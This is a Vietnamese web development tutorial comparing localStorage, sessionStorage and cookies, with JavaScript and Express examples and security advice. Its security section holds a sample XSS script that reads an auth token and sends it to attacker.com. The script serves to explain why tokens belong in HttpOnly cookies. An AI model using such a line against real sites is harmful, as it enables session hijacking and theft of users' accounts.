# So sánh localStorage, sessionStorage và Cookies

## 1. Tổng quan về Web Storage

Trong phát triển web, việc lưu trữ dữ liệu phía client là một nhu cầu thiết yếu. Có ba phương thức chính để lưu trữ dữ liệu trên browser: **localStorage**, **sessionStorage**, và **Cookies**. Mỗi phương thức có đặc điểm, ưu nhược điểm và trường hợp sử dụng riêng.

## 2. localStorage

### 2.1. localStorage là gì?

**localStorage** là một Web Storage API cho phép lưu trữ dữ liệu dạng key-value trên browser của người dùng mà không có thời gian hết hạn. Dữ liệu được lưu trữ sẽ tồn tại ngay cả khi người dùng đóng browser hoặc tắt máy tính.

### 2.2. Đặc điểm của localStorage

- **Dung lượng**: Khoảng 5-10MB (tùy browser)
- **Thời gian tồn tại**: Vĩnh viễn cho đến khi bị xóa thủ công
- **Phạm vi**: Trong cùng một origin (protocol + domain + port)
- **Gửi đến server**: Không tự động gửi kèm request
- **Truy cập**: Chỉ có thể truy cập từ JavaScript phía client

### 2.3. Cách sử dụng localStorage

```javascript
// Lưu dữ liệu
localStorage.setItem('username', 'John Doe');
localStorage.setItem('theme', 'dark');

// Lấy dữ liệu
const username = localStorage.getItem('username');
console.log(username); // Output: John Doe

// Lưu object (phải chuyển sang JSON)
const user = { name: 'John', age: 30 };
localStorage.setItem('user', JSON.stringify(user));

// Lấy object
const storedUser = JSON.parse(localStorage.getItem('user'));
console.log(storedUser.name); // Output: John

// Xóa một item
localStorage.removeItem('username');

// Xóa tất cả
localStorage.clear();

// Kiểm tra số lượng items
console.log(localStorage.length);

// Lấy key theo index
const key = localStorage.key(0);
```

### 2.4. Khi nào nên dùng localStorage?

- **Lưu trữ settings/preferences của người dùng**: theme (dark/light mode), ngôn ngữ, layout preferences
- **Cache dữ liệu**: Lưu trữ dữ liệu đã fetch từ API để giảm số lần gọi API
- **Dữ liệu không nhạy cảm**: Lưu trữ dữ liệu công khai, không quan trọng về bảo mật
- **Giỏ hàng shopping**: Lưu trữ sản phẩm trong giỏ hàng (nếu không cần đồng bộ với server ngay)
- **Draft content**: Lưu nội dung đang soạn thảo (blog post, form data) để tránh mất dữ liệu

### 2.5. Ưu điểm của localStorage

- Dung lượng lớn hơn cookies (5-10MB so với 4KB)
- Không tự động gửi đến server, giảm băng thông
- API đơn giản, dễ sử dụng
- Dữ liệu tồn tại vĩnh viễn
- Đồng bộ giữa các tab/window trong cùng origin

### 2.6. Nhược điểm của localStorage

- **Không an toàn**: Dễ bị tấn công XSS (Cross-Site Scripting)
- **Chỉ lưu string**: Phải serialize/deserialize object
- **Đồng bộ (Synchronous)**: Có thể block UI nếu thao tác quá nhiều
- **Không có thời gian hết hạn tự động**: Phải tự quản lý
- **Không thể truy cập từ Web Workers**

## 3. sessionStorage

### 3.0.0. Tổng quan về Session

#### 3.0.0.1. Session là gì?
Session (phiên làm việc) là một cơ chế cho phép server lưu trữ thông tin về người dùng trong suốt quá trình tương tác của họ với ứng dụng web. Session giúp duy trì trạng thái (state) của người dùng giữa các HTTP requests khác nhau.
HTTP là giao thức stateless (không trạng thái), nghĩa là mỗi request độc lập và server không "nhớ" request trước đó. Session được sinh ra để giải quyết vấn đề này.

#### 3.0.0.2. Tại sao cần Session?

```
Không có Session:
User → Request 1: Login ✓
User → Request 2: View profile → Server: "Bạn là ai?" ❌
User → Request 3: Add to cart → Server: "Bạn là ai?" ❌

Có Session:
User → Request 1: Login ✓ → Server tạo session
User → Request 2: View profile → Server: "À, bạn là John!" ✓
User → Request 3: Add to cart → Server: "John đã thêm sản phẩm!" ✓
```

### 3.0.1. Cơ chế hoạt động của Session

#### 3.0.1.1. Quy trình cơ bản

```
1. User gửi request đăng nhập
   ↓
2. Server xác thực thành công
   ↓
3. Server tạo Session ID (unique)
   ↓
4. Server lưu Session data vào bộ nhớ/database
   ↓
5. Server gửi Session ID về client (qua Cookie)
   ↓
6. Client lưu Session ID trong Cookie
   ↓
7. Mọi request tiếp theo, client gửi kèm Session ID
   ↓
8. Server dùng Session ID để tìm Session data
   ↓
9. Server biết được user và trạng thái của họ
```

#### 3.0.1.2. Ví dụ chi tiết
```javascript
// ===== SERVER SIDE (Node.js + Express) =====

const express = require('express');
const session = require('express-session');
const app = express();

// Cấu hình session middleware
app.use(session({
  secret: 'my-secret-key',           // Key để mã hóa session ID
  resave: false,                      // Không lưu lại session nếu không thay đổi
  saveUninitialized: false,           // Không tạo session cho request không đăng nhập
  cookie: { 
    secure: false,                    // true nếu dùng HTTPS
    httpOnly: true,                   // Không cho JavaScript truy cập
    maxAge: 24 * 60 * 60 * 1000      // 24 giờ
  }
}));

// Route đăng nhập
app.post('/login', (req, res) => {
  const { username, password } = req.body;
  
  // Xác thực user (ví dụ đơn giản)
  if (username === 'john' && password === '123456') {
    // Lưu thông tin vào session
    req.session.userId = 1;
    req.session.username = 'john';
    req.session.role = 'admin';
    req.session.loginTime = new Date();
    
    res.json({ success: true, message: 'Logged in' });
  } else {
    res.status(401).json({ success: false, message: 'Invalid credentials' });
  }
});

// Route protected - cần đăng nhập
app.get('/profile', (req, res) => {
  // Kiểm tra session
  if (req.session.userId) {
    res.json({
      userId: req.session.userId,
      username: req.session.username,
      role: req.session.role,
      loginTime: req.session.loginTime
    });
  } else {
    res.status(401).json({ message: 'Please login first' });
  }
});

// Logout - xóa session
app.post('/logout', (req, res) => {
  req.session.destroy((err) => {
    if (err) {
      res.status(500).json({ message: 'Logout failed' });
    } else {
      res.clearCookie('connect.sid'); // Xóa cookie chứa session ID
      res.json({ message: 'Logged out successfully' });
    }
  });
});

// ===== CLIENT SIDE =====

// Login
async function login() {
  const response = await fetch('/login', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    credentials: 'include', // Quan trọng: Gửi và nhận cookies
    body: JSON.stringify({
      username: 'john',
      password: '123456'
    })
  });
  
  const data = await response.json();
  console.log(data); // { success: true, message: 'Logged in' }
  
  // Browser tự động lưu session cookie
}

// Truy cập protected route
async function getProfile() {
  const response = await fetch('/profile', {
    credentials: 'include' // Gửi kèm session cookie
  });
  
  const data = await response.json();
  console.log(data);
  // { userId: 1, username: 'john', role: 'admin', ... }
}

// Logout
async function logout() {
  const response = await fetch('/logout', {
    method: 'POST',
    credentials: 'include'
  });
  
  const data = await response.json();
  console.log(data); // { message: 'Logged out successfully' }
}
```

### 3.1. sessionStorage là gì?

**sessionStorage** tương tự như localStorage nhưng dữ liệu chỉ tồn tại trong phiên làm việc (session) của browser. Khi đóng tab hoặc window, dữ liệu sẽ bị xóa.

### 3.2. Đặc điểm của sessionStorage

- **Dung lượng**: Khoảng 5-10MB (tùy browser)
- **Thời gian tồn tại**: Cho đến khi đóng tab/window
- **Phạm vi**: Riêng biệt cho mỗi tab/window, ngay cả cùng URL
- **Gửi đến server**: Không tự động gửi kèm request
- **Truy cập**: Chỉ có thể truy cập từ JavaScript phía client

### 3.3. Cách sử dụng sessionStorage

```javascript
// API giống hệt localStorage
sessionStorage.setItem('sessionID', '12345');
sessionStorage.setItem('tempData', 'some value');

const sessionID = sessionStorage.getItem('sessionID');
console.log(sessionID); // Output: 12345

// Lưu object
const tempUser = { id: 1, role: 'guest' };
sessionStorage.setItem('tempUser', JSON.stringify(tempUser));

// Lấy object
const storedTempUser = JSON.parse(sessionStorage.getItem('tempUser'));

// Xóa
sessionStorage.removeItem('sessionID');
sessionStorage.clear();
```

### 3.4. Khi nào nên dùng sessionStorage?

- **Dữ liệu tạm thời**: Dữ liệu chỉ cần trong phiên làm việc hiện tại
- **Form multi-step**: Lưu trữ dữ liệu giữa các bước của form
- **Wizard/Tutorial**: Lưu trạng thái tiến trình
- **Temporary authentication**: Token tạm thời cho phiên làm việc
- **Page state**: Lưu trạng thái trang (filters, sorting, pagination) trong tab hiện tại
- **Shopping session**: Dữ liệu mua sắm tạm thời trong một phiên

### 3.5. Ưu điểm của sessionStorage

- Tự động xóa khi đóng tab/window (tự quản lý lifetime)
- Không bị chia sẻ giữa các tab (tăng tính riêng tư)
- Dung lượng lớn (5-10MB)
- API đơn giản như localStorage
- Không gửi đến server

### 3.6. Nhược điểm của sessionStorage

- **Mất dữ liệu khi đóng tab**: Không phù hợp cho dữ liệu cần lưu lâu dài
- **Không chia sẻ giữa tabs**: Mỗi tab có storage riêng
- **Không an toàn**: Vẫn dễ bị XSS
- **Chỉ lưu string**: Cần serialize/deserialize
- **Đồng bộ (Synchronous)**: Có thể ảnh hưởng performance

## 4. Cookies

### 4.1. Cookies là gì?

**Cookies** là những file text nhỏ được lưu trữ trên browser của người dùng. Khác với localStorage/sessionStorage, cookies được tự động gửi kèm theo mọi HTTP request đến server trong cùng domain.

### 4.2. Đặc điểm của Cookies

- **Dung lượng**: Tối đa 4KB per cookie
- **Thời gian tồn tại**: Có thể đặt expires/max-age hoặc session cookie
- **Phạm vi**: Có thể đặt domain và path
- **Gửi đến server**: Tự động gửi kèm mọi HTTP request
- **Truy cập**: Có thể truy cập từ cả client (JavaScript) và server

### 4.3. Các thuộc tính của Cookies

```javascript
// Expires/Max-Age: Thời gian hết hạn
document.cookie = "username=John; expires=Fri, 31 Dec 2025 23:59:59 GMT";
document.cookie = "token=abc123; max-age=3600"; // 1 hour

// Domain: Domain có thể truy cập cookie
document.cookie = "user=John; domain=example.com";

// Path: Đường dẫn có thể truy cập cookie
document.cookie = "session=xyz; path=/admin";

// Secure: Chỉ gửi qua HTTPS
document.cookie = "token=secret; secure";

// HttpOnly: Không thể truy cập từ JavaScript (chỉ server)
// Phải set từ server: Set-Cookie: sessionId=abc; HttpOnly

// SameSite: Bảo vệ khỏi CSRF attacks
document.cookie = "token=xyz; SameSite=Strict";
// Strict: Không gửi cookie trong cross-site requests
// Lax: Gửi trong một số cross-site navigation
// None: Gửi trong mọi cross-site requests (cần Secure)
```

### 4.4. Cách sử dụng Cookies

```javascript
// Set cookie đơn giản
document.cookie = "username=John Doe";

// Set cookie với expires
const d = new Date();
d.setTime(d.getTime() + (7*24*60*60*1000)); // 7 days
document.cookie = `username=John Doe; expires=${d.toUTCString()}; path=/`;

// Hàm helper để set cookie
function setCookie(name, value, days) {
  const d = new Date();
  d.setTime(d.getTime() + (days*24*60*60*1000));
  const expires = "expires=" + d.toUTCString();
  document.cookie = `${name}=${value}; ${expires}; path=/`;
}

setCookie("theme", "dark", 30);

// Get cookie
function getCookie(name) {
  const nameEQ = name + "=";
  const ca = document.cookie.split(';');
  for(let i = 0; i < ca.length; i++) {
    let c = ca[i];
    while (c.charAt(0) == ' ') c = c.substring(1, c.length);
    if (c.indexOf(nameEQ) == 0) return c.substring(nameEQ.length, c.length);
  }
  return null;
}

const theme = getCookie("theme");
console.log(theme); // Output: dark

// Delete cookie (set expires to past date)
function deleteCookie(name) {
  document.cookie = `${name}=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/`;
}

deleteCookie("theme");
```

### 4.5. Khi nào nên dùng Cookies?

- **Authentication/Authorization**: Lưu access token, session ID
- **Tracking**: Theo dõi hành vi người dùng
- **Personalization**: Lưu preferences cần gửi đến server
- **Shopping cart**: Khi cần đồng bộ với server
- **Remember me**: Lưu trạng thái đăng nhập
- **CSRF protection**: Token bảo vệ

### 4.6. Ưu điểm của Cookies

- **Tự động gửi đến server**: Tiện cho authentication
- **Server-side access**: Server có thể đọc và set cookies
- **Expires control**: Có thể đặt thời gian hết hạn chính xác
- **Secure + HttpOnly**: Tăng cường bảo mật
- **Cross-subdomain**: Có thể share giữa subdomains
- **SameSite attribute**: Bảo vệ khỏi CSRF

### 4.7. Nhược điểm của Cookies

- **Dung lượng nhỏ**: Chỉ 4KB per cookie
- **Tăng bandwidth**: Gửi kèm mọi request (kể cả images, CSS, JS)
- **Giới hạn số lượng**: Khoảng 20-50 cookies per domain
- **API phức tạp**: Khó sử dụng hơn localStorage/sessionStorage
- **Privacy concerns**: Dễ bị theo dõi

## 5. So sánh chi tiết localStorage, sessionStorage và Cookies

### 5.1. Bảng so sánh tổng quan

| Đặc điểm | localStorage | sessionStorage | Cookies |
|----------|-------------|----------------|---------|
| **Dung lượng** | 5-10MB | 5-10MB | 4KB |
| **Thời gian tồn tại** | Vĩnh viễn | Đến khi đóng tab | Có thể set expires |
| **Phạm vi** | Same origin, all tabs | Same origin, per tab | Same domain (config được) |
| **Gửi đến server** | Không | Không | Tự động |
| **API** | Đơn giản | Đơn giản | Phức tạp |
| **Bảo mật** | Kém (XSS) | Kém (XSS) | Tốt hơn (HttpOnly, Secure) |
| **Performance** | Synchronous | Synchronous | Synchronous |
| **Browser support** | Modern browsers | Modern browsers | All browsers |

### 5.2. So sánh về Bảo mật

#### localStorage & sessionStorage
```javascript
// Dễ bị XSS attack
// Hacker có thể inject script và đánh cắp dữ liệu
<script>
  // Malicious script
  const token = localStorage.getItem('authToken');
  fetch('https://attacker.com/steal?token=' + token);
</script>

// ❌ KHÔNG BAO GIỜ lưu sensitive data
localStorage.setItem('password', '123456'); // NGUY HIỂM!
localStorage.setItem('creditCard', '1234-5678-9012-3456'); // NGUY HIỂM!
```

#### Cookies
```javascript
// ✅ An toàn hơn với HttpOnly và Secure
// Set từ server (Node.js/Express example):
res.cookie('authToken', 'xyz123', {
  httpOnly: true,  // JavaScript không thể truy cập
  secure: true,    // Chỉ gửi qua HTTPS
  sameSite: 'strict', // Bảo vệ CSRF
  maxAge: 3600000  // 1 hour
});

// JavaScript KHÔNG thể đọc cookie có HttpOnly
console.log(document.cookie); // authToken sẽ không hiển thị
```

### 5.3. So sánh về Performance

#### localStorage/sessionStorage
```javascript
// Synchronous - có thể block UI thread
for(let i = 0; i < 1000; i++) {
  localStorage.setItem(`key${i}`, 'value' + i);
}
// Nếu có nhiều operations, có thể làm giật lag UI

// Giải pháp: Throttle/debounce hoặc batch operations
function batchSave(data) {
  requestIdleCallback(() => {
    Object.entries(data).forEach(([key, value]) => {
      localStorage.setItem(key, value);
    });
  });
}
```

#### Cookies
```javascript
// Tăng bandwidth vì gửi kèm mọi request
// Ví dụ: Cookie 1KB, 100 requests = 100KB overhead

// ❌ Không tốt
document.cookie = "bigData=" + largeString; // Gửi kèm mọi request

// ✅ Tốt hơn: Chỉ set cookie nhỏ, dữ liệu lớn dùng localStorage
document.cookie = "sessionId=abc123";
localStorage.setItem('bigData', largeString);
```

### 5.4. So sánh về Tính năng đồng bộ

#### localStorage
```javascript
// Đồng bộ giữa các tabs
// Tab 1:
localStorage.setItem('sharedData', 'Hello');

// Tab 2: Tự động cập nhật
window.addEventListener('storage', (e) => {
  console.log('Key:', e.key);
  console.log('Old value:', e.oldValue);
  console.log('New value:', e.newValue);
});
```

#### sessionStorage
```javascript
// KHÔNG đồng bộ giữa tabs
// Tab 1:
sessionStorage.setItem('tabData', 'Tab 1');

// Tab 2:
console.log(sessionStorage.getItem('tabData')); // null
sessionStorage.setItem('tabData', 'Tab 2'); // Độc lập với Tab 1
```

#### Cookies
```javascript
// Share giữa tabs, nhưng không có event listener
// Cần polling để check changes
function checkCookieChange() {
  const currentValue = getCookie('sharedCookie');
  if (currentValue !== lastValue) {
    // Cookie changed
    lastValue = currentValue;
  }
}
setInterval(checkCookieChange, 1000);
```

## 6. Best Practices

### 6.1. localStorage Best Practices

```javascript
// 1. Luôn kiểm tra browser support
if (typeof(Storage) !== "undefined") {
  localStorage.setItem('key', 'value');
}

// 2. Wrap trong try-catch (quota exceeded error)
try {
  localStorage.setItem('key', largeData);
} catch (e) {
  if (e.name === 'QuotaExceededError') {
    console.error('localStorage quota exceeded');
    // Clear old data or notify user
  }
}

// 3. Set expiration manually
function setWithExpiry(key, value, ttl) {
  const now = new Date();
  const item = {
    value: value,
    expiry: now.getTime() + ttl,
  };
  localStorage.setItem(key, JSON.stringify(item));
}

function getWithExpiry(key) {
  const itemStr = localStorage.getItem(key);
  if (!itemStr) return null;
  
  const item = JSON.parse(itemStr);
  const now = new Date();
  
  if (now.getTime() > item.expiry) {
    localStorage.removeItem(key);
    return null;
  }
  return item.value;
}

// Usage
setWithExpiry('token', 'abc123', 3600000); // 1 hour

// 4. Namespace keys để tránh conflict
const APP_PREFIX = 'myapp_';
localStorage.setItem(APP_PREFIX + 'user', 'John');

// 5. Encrypt sensitive data (nếu bắt buộc phải lưu)
// Sử dụng thư viện như CryptoJS
const encrypted = CryptoJS.AES.encrypt('sensitive', 'secret-key').toString();
localStorage.setItem('data', encrypted);
```

### 6.2. sessionStorage Best Practices

```javascript
// 1. Sử dụng cho temporary state
function saveFormProgress() {
  const formData = {
    step: currentStep,
    data: getCurrentFormData()
  };
  sessionStorage.setItem('formProgress', JSON.stringify(formData));
}

// 2. Clear khi hoàn thành
function completeForm() {
  // Process form
  sessionStorage.removeItem('formProgress');
}

// 3. Restore state on page load
window.addEventListener('DOMContentLoaded', () => {
  const saved = sessionStorage.getItem('formProgress');
  if (saved) {
    const { step, data } = JSON.parse(saved);
    restoreForm(step, data);
  }
});
```

### 6.3. Cookies Best Practices

```javascript
// 1. Luôn set Secure và HttpOnly (từ server)
// Express.js example:
app.use(cookieParser());
res.cookie('authToken', token, {
  httpOnly: true,
  secure: process.env.NODE_ENV === 'production',
  sameSite: 'strict',
  maxAge: 24 * 60 * 60 * 1000 // 24 hours
});

// 2. Sử dụng thư viện helper
// js-cookie library
import Cookies from 'js-cookie';

Cookies.set('name', 'value', { expires: 7, path: '/' });
const value = Cookies.get('name');
Cookies.remove('name');

// 3. Set proper domain cho subdomains
Cookies.set('user', 'John', { domain: '.example.com' });
// Accessible from: example.com, www.example.com, api.example.com

// 4. Implement CSRF protection
// Server generates CSRF token
const csrfToken = generateToken();
res.cookie('XSRF-TOKEN', csrfToken, {
  httpOnly: false, // Client cần đọc được
  secure: true,
  sameSite: 'strict'
});

// Client gửi token trong request
fetch('/api/data', {
  headers: {
    'X-XSRF-TOKEN': Cookies.get('XSRF-TOKEN')
  }
});
```

## 7. Use Cases thực tế

### 7.1. Authentication System

```javascript
// ✅ Best approach: Cookies cho auth token
// Server (Node.js):
app.post('/login', async (req, res) => {
  const user = await authenticateUser(req.body);
  const token = generateJWT(user);
  
  res.cookie('authToken', token, {
    httpOnly: true,  // Bảo vệ khỏi XSS
    secure: true,
    sameSite: 'strict',
    maxAge: 7 * 24 * 60 * 60 * 1000 // 7 days
  });
  
  res.json({ success: true, user });
});

// Client: Cookie tự động gửi kèm requests
fetch('/api/protected', {
  credentials: 'include' // Include cookies
});

// localStorage cho user preferences
localStorage.setItem('theme', user.preferences.theme);
localStorage.setItem('language', user.preferences.language);
```

### 7.2. E-commerce Shopping Cart

```javascript
// Hybrid approach
class ShoppingCart {
  constructor() {
    this.storageKey = 'shopping_cart';
  }
  
  // localStorage: Lưu cart cho guest users
  saveToLocal(cart) {
    localStorage.setItem(this.storageKey, JSON.stringify(cart));
  }
  
  getFromLocal() {
    const stored = localStorage.getItem(this.storageKey);
    return stored ? JSON.parse(stored) : [];
  }
  
  // Server: Sync cho logged-in users
  async syncWithServer(cart) {
    await fetch('/api/cart', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(cart),
      credentials: 'include' // Send auth cookie
    });
  }
  
  addItem(product) {
    const cart = this.getFromLocal();
    cart.push(product);
    this.saveToLocal(cart);
    
    if (this.isLoggedIn()) {
      this.syncWithServer(cart);
    }
  }
}
```

### 7.3. Multi-step Form

```javascript
// sessionStorage: Perfect cho wizard forms
class FormWizard {
  constructor(formId) {
    this.formId = formId;
    this.storageKey = `form_${formId}`;
  }
  
  saveStep(stepNumber, data) {
    const formData = this.getFormData() || {};
    formData[`step${stepNumber}`] = data;
    formData.currentStep = stepNumber;
    formData.lastUpdated = new Date().toISOString();
    
    sessionStorage.setItem(this.storageKey, JSON.stringify(formData));
  }
  
  getFormData() {
    const stored = sessionStorage.getItem(this.storageKey);
    return stored ? JSON.parse(stored) : null;
  }
  
  clearForm() {
    sessionStorage.removeItem(this.storageKey);
  }
  
  // Restore on page load
  restore() {
    const data = this.getFormData();
    if (data) {
      this.goToStep(data.currentStep);
      this.fillFormData(data);
    }
  }
}

// Usage
const wizard = new FormWizard('registration');
wizard.restore(); // On page load

// Step 1 complete
wizard.saveStep(1, { name: 'John', email: 'john@example.com' });

// Step 2 complete
wizard.saveStep(2, { address: '123 Main St', city: 'NYC' });

// Final submission
wizard.clearForm();
```

### 7.4. Remember Me Feature

```javascript
// Cookies: Persistent login
app.post('/login', async (req, res) => {
  const { username, password, rememberMe } = req.body;
  const user = await authenticateUser(username, password);
  
  if (user) {
    const token = generateJWT(user);
    const cookieOptions = {
      httpOnly: true,
      secure: true,
      sameSite: 'strict'
    };
    
    if (rememberMe) {
      // Long-lived cookie (30 days)
      cookieOptions.maxAge = 30 * 24 * 60 * 60 * 1000;
    }
    // Else: Session cookie (cleared when browser closes)
    
    res.cookie('authToken', token, cookieOptions);
    res.json({ success: true });
  }
});
```

## 8. Migration và Compatibility

### 8.1. Fallback strategies

```javascript
// Storage wrapper với fallback
class Storage {
  constructor() {
    this.storage = this.getAvailableStorage();
  }
  
  getAvailableStorage() {
    // Try localStorage first
    try {
      if (typeof localStorage !== 'undefined') {
        localStorage.setItem('test', 'test');
        localStorage.removeItem('test');
        return localStorage;
      }
    } catch (e) {}
    
    // Fallback to sessionStorage
    try {
      if (typeof sessionStorage !== 'undefined') {
        return sessionStorage;
      }
    } catch (e) {}
    
    // Fallback to memory storage
    return new MemoryStorage();
  }
  
  setItem(key, value) {
    this.storage.setItem(key, value);
  }
  
  getItem(key) {
    return this.storage.getItem(key);
  }
}

// Memory storage fallback
class MemoryStorage {
  constructor() {
    this.data = {};
  }
  
  setItem(key, value) {
    this.data[key] = String(value);
  }
  
  getItem(key) {
    return this.data.hasOwnProperty(key) ? this.data[key] : null;
  }
  
  removeItem(key) {
    delete this.data[key];
  }
  
  clear() {
    this.data = {};
  }
}
```

## 9. Kết luận

### 9.1. Decision Tree: Nên dùng gì?

```
Cần gửi data đến server với mọi request?
├─ YES → Cookies (authentication, tracking)
└─ NO → Continue
    │
    Dữ liệu có nhạy cảm không?
    ├─ YES → Cookies với HttpOnly + Secure
    └─ NO → Continue
        │
        Cần lưu lâu dài (qua sessions)?
        ├─ YES → localStorage (preferences, cache)
        └─ NO → sessionStorage (temporary state)
```

### 9.2. Tóm tắt khi nào dùng gì

**localStorage**:
- User preferences (theme, language)
- Cached data
- Draft content
- Non-sensitive data cần persist

**sessionStorage**:
- Temporary form data
- Wizard/multi-step state
- Per-tab data
- Single-session data

**Cookies**:
- Authentication tokens
- Session management
- Tracking
- Data cần gửi đến server
- Cross-subdomain sharing

### 9.3. Bảo mật - Điều quan trọng nhất

- ❌ KHÔNG BAO GIỜ lưu passwords, credit cards, private keys trong bất kỳ client storage nào
- ✅ Cookies với HttpOnly + Secure + SameSite cho auth tokens
- ✅ localStorage/sessionStorage chỉ cho non-sensitive data
- ✅ Luôn validate và sanitize data trước khi lưu
- ✅ Implement CSRF protection khi dùng cookies
- ✅ Use HTTPS để bảo vệ data in transit

Việc lựa chọn đúng phương thức storage là rất quan trọng cho cả hiệu năng và bảo mật của ứng dụng web. Hiểu rõ đặc điểm và use cases của từng phương thức sẽ giúp bạn xây dựng ứng dụng tốt hơn.